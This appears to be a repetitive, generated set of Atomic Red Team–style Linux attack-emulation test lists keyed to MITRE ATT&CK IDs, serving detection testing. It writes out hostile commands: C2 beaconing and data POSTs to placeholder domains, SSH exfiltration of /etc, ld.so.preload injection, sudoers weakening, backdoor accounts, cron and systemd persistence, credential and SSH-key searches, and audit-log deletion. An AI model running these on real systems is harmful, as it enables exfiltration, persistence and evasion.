curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1136 ,T1153 ,T1040 ,T1069 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1064 ,T1139 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1158 ,T1154 ,T1040 ,T1083 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1158 ,T1064 ,T1081 ,T1083 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1154 ,T1139 ,T1083 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1215 ,T1154 ,T1040 ,T1069 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1215 ,T1064 ,T1040 ,T1083 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1136 ,T1153 ,T1040 ,T1135 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1153 ,T1081 ,T1083 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1136 ,T1154 ,T1081 ,T1201 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1064 ,T1139 ,T1217 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1215 ,T1064 ,T1145 ,T1082 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1064 ,T1040 ,T1033 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1154 ,T1040 ,T1069 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

